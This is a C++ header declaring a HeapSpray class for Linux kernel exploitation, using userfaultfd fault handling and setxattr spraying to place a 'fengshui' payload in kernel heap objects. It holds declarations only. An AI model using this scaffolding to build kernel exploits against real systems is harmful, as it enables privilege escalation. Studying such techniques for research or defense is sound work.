#pragma once
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <poll.h>

typedef void * (*THREADFUNCPTR)(void *);
#define MAX_ROUND 512
#define OBJS_EACH_ROUND 64
#define do_spray(round, shade) \
    fork_and_spray(round, 1, shade, 1); \
    sleep(1);

class HeapSpray {
    public:
        HeapSpray();
        
        int page_size;
        pthread_mutex_t *lock[MAX_ROUND];
        size_t objectSize = 0;
        size_t payloadSize = 0;
        char *fengshuiPayload = NULL;
        int default_objs_num;
        
        void fork_and_spray(int round, int objs_each_round, int shade, int new_page);
        void init_heap_spray(int _objectSize, char* _payload, int _payloadSize);
        void do_heap_spray(int loop);
        void do_free(u_int64_t val);
        void change_payload(char* payload, int size);

    private:
        int i=0;
        pthread_mutex_t *order_lock;
        void *page;
        void *spray_data[MAX_ROUND] = {0, };

        int init_userfaultfd(void *addr, char *payload, int size);
        void *init_pages();
        static void *fault_handler_thread(void *arg);
        static void *spray(void* arg);
        static void *spray_setxattr(void *arg);
};